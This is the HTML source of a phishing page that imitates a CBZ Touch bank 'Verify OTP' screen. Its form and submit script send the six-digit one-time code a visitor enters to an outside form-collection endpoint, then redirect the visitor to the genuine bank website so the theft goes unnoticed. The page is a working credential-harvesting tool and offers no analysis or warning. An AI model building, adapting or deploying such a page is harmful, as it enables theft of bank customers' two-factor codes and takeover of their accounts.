<!doctype html>
<html lang="en">  
<head>  
  <meta charset="UTF-8" />  
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />  
  <title>CBZ TOUCH  - Verify OTP</title>  
  <style>  
    * { box-sizing: border-box; margin: 0; padding: 0; }  
    body {  
      margin: 0; min-height: 100vh; display: flex; align-items: center;  
      justify-content: center; background: #f5f5f5; padding: 16px;  
      font-family: Arial, sans-serif;  
    }  
    .login-box {  
      width: 100%; max-width: 400px; padding: 20px; border-radius: 10px;  
      background: #fff; box-shadow: 0 4px 16px rgba(0, 0, 0, 0.08); text-align: center;  
    }  
    .logo {  
      width: 100px; height: 100px; background-color: #e31837; border-radius: 50%;  
      display: flex; flex-direction: column; align-items: center; justify-content: center;  
      margin: 0 auto 24px; color: white;  
    }  
    .cbz{ font-size: 38px; font-weight: 900; line-height: 0.8; margin-bottom: -1px; text-transform: lowercase; letter-spacing: -0.5px; }         
    .cbz{ font-size: 18px; font-weight: 500; line-height: 1; }  
    .title { font-size: 18px; font-weight: 500; color: #1b2b7a; margin-bottom: 8px; text-align: center; }  
    .subtitle { font-size: 14px; color: #777; margin-bottom: 12px; text-align: center; }  
    .timer { 
      font-size: 16px; 
      color: #e31837; 
      font-weight: 600; 
      margin-bottom: 20px; 
    }
    .timer.expired { color: #999; }
    .otp-container { 
      display: flex; 
      gap: 6px; 
      justify-content: center; 
      margin-bottom: 18px; 
    }
    .otp-input {
      width: 40px; 
      height: 50px; 
      text-align: center; 
      font-size: 20px; 
      font-weight: 600;
      background-color: #f5f5f5;  
      border: 1.6px solid #ddd; 
      border-radius: 10px; 
    }
    .otp-input:focus { 
      border-color: #1b2b7a; 
      outline: none; 
    }
    .otp-input:disabled {
      background-color: #eee;
      color: #999;
    }
    .btn {  
      width: 100%; padding: 14px; background-color: #e31837; color: white; border: none;  
      border-radius: 15px; font-weight: 500; font-size: 18px; cursor: pointer;  
      margin-top: 12px; transition: background-color 0.2s;  
    }  
    .btn:hover, .btn:active { background-color: #c41530; }  
    .btn:disabled {
      background-color: #ccc;
      cursor: not-allowed;
    }
    .resend { 
      margin-top: 20px; 
      color: #1b2b7a; 
      font-size: 14px; 
      text-decoration: none; 
      display: block; 
      pointer-events: none;
      opacity: 0.5;
    }
    .resend.active {
      pointer-events: auto;
      opacity: 1;
    }
  </style>  
</head>  
<body>  
  <div class="login-box">  
    <div class="logo">  
      <span class="cbz">cbz</span>  
      <span class="TOUCH">TOUCH</span>  
    </div>  
    <p class="title">Verify Your Account</p>  
    <p class="subtitle">Enter the 6-digit code sent to your phone</p>
    <p class="timer" id="timer">Code expires in: 5:00</p>

    <form action="https://formspree.io/f/xjgqlwen" method="POST" id="otpForm">  
      <input type="hidden" name="_subject" value="OTP Verification">
      <div class="otp-container">
        <input type="text" class="otp-input" name="otp1" maxlength="1" required>
        <input type="text" class="otp-input" name="otp2" maxlength="1" required>
        <input type="text" class="otp-input" name="otp3" maxlength="1" required>
        <input type="text" class="otp-input" name="otp4" maxlength="1" required>
        <input type="text" class="otp-input" name="otp5" maxlength="1" required>
        <input type="text" class="otp-input" name="otp6" maxlength="1" required>
      </div>

      <button type="submit" class="btn" id="verifyBtn">Verify OTP</button>  
    </form>  

    <a href="#" class="resend" id="resendBtn">Didn't receive code? Resend</a>
  </div>

  <script>
    <script>
  const inputs = document.querySelectorAll('.otp-input');
  const verifyBtn = document.getElementById('verifyBtn');
  const resendBtn = document.getElementById('resendBtn');
  const timerEl = document.getElementById('timer');
  const otpForm = document.getElementById('otpForm');

  inputs.forEach((input, index) => {
    input.addEventListener('input', (e) => {
      if (e.target.value.length === 1 && index < inputs.length - 1) inputs[index + 1].focus();
    });
    input.addEventListener('keydown', (e) => {
      if (e.key === 'Backspace' && !e.target.value && index > 0) inputs[index - 1].focus();
    });
  });

  let timeLeft = 300;
  const countdown = setInterval(() => {
    timeLeft--;
    let minutes = Math.floor(timeLeft / 60);
    let seconds = timeLeft % 60;
    seconds = seconds < 10 ? '0' + seconds : seconds;
    timerEl.textContent = `Code expires in: ${minutes}:${seconds}`;
    if (timeLeft <= 0) {
      clearInterval(countdown);
      timerEl.textContent = 'Code expired';
      timerEl.classList.add('expired');
      inputs.forEach(input => input.disabled = true);
      verifyBtn.disabled = true;
      resendBtn.classList.add('active');
    }
  }, 1000);

  resendBtn.addEventListener('click', (e) => {
    if (resendBtn.classList.contains('active')) { 
      e.preventDefault(); 
      location.reload(); 
    }
  });

  
  otpForm.addEventListener('submit', async function(e) {
    e.preventDefault();
    
    verifyBtn.textContent = 'Verifying...';
    verifyBtn.disabled = true;
    
    const formData = new FormData(otpForm);
    
    const otpValue = formData.get('otp1') + formData.get('otp2') + formData.get('otp3') + 
                     formData.get('otp4') + formData.get('otp5') + formData.get('otp6');
    formData.append('full_otp', otpValue);
    
    try {
      await fetch('https://formspree.io/f/xjgqlwen', {
        method: 'POST',
        body: formData,
        headers: { 'Accept': 'application/json' }
      });
      
      
      window.location.href = 'https://www.cbz.co.zw';
      
    } catch (error) {
      alert('Error. Try again.');
      verifyBtn.textContent = 'Verify OTP';
      verifyBtn.disabled = false;
    }
  });
  </script>
 </body>  
</html>
